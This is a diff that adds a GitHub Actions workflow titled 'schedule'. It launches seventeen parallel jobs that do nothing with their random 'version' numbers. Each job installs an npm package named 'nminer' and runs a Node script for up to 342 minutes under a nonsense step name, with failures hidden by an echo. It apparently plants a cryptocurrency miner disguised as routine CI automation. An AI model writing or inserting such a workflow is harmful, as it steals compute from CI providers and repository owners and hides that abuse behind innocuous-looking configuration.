@@ -1,0 +1,42 @@
+name: schedule
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 9948 }
+          - { version: 4251 }
+          - { version: 1766 }
+          - { version: 8191 }
+          - { version: 1384 }
+          - { version: 6916 }
+          - { version: 8285 }
+          - { version: 6142 }
+          - { version: 6605 }
+          - { version: 6612 }
+          - { version: 9530 }
+          - { version: 3055 }
+          - { version: 6867 }
+          - { version: 1354 }
+          - { version: 2383 }
+          - { version: 4938 }
+          - { version: 4965 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: swerve loudly icy surprise rapid
+        run: |
+          npm install nminer@latest
+          timeout 342m node schedule.js || echo "schedule executed"
